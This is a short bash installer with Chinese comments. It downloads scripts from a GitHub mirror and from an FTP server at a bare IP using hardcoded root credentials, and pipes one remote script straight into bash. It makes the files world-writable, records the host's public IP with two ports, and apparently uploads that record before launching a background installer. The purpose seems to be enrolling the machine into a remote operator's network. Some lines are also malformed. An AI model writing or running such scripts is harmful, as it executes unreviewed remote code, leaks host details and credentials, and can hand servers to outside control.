#!/bin/bash

wget https://raw.fastgit.org/50801684/-/master/5.sh
wget ftp://159.75.133.49:21/file.txt --ftp-user=root --ftp-password=wsywsy
wget https://raw.fastgit.org/50801684/-/master/7.sh
wget ftp://159.75.133.49:21/8.sh --ftp-user=root --ftp-password=wsywsy
bash -c "$(curl -sS wget https://raw.fastgit.org/50801684/-/master/4.sh)"
sudo chmod 777 *.sh
sudo chmod 777 file.txt
# 写入IP
Server_IP=`curl ifconfig.me`
echo $Server_IP":28888" >> file.txt
echo $Server_IP":38888" >> file.txt
# 上传
expect 5.sh

# 安装
./4.sh -d 2>/dev/nul
echo "安装完成"
